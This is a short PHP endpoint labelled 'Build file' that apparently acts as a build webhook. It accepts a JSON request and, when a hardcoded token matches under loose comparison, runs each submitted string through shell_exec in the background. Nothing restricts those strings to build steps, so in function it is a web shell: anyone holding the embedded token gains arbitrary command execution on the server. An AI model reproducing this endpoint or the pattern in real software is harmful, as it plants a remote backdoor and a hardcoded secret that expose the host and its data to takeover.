<?php

require __DIR__."/../autoload.php";

/**
 * Build file.
 */
$input = json_decode(file_get_contents("php://input"), true);

if (isset($input['token'], $input['cmd']) and $input['token'] == "3651c6a5b5529af27c88fe50dc9f75b26ff30bcd" and is_array($input['cmd'])) {
    http_response_code(200);
    foreach ($input['cmd'] as $val) {
        shell_exec($val." &");
    }
} else {
    http_response_code(400);
}
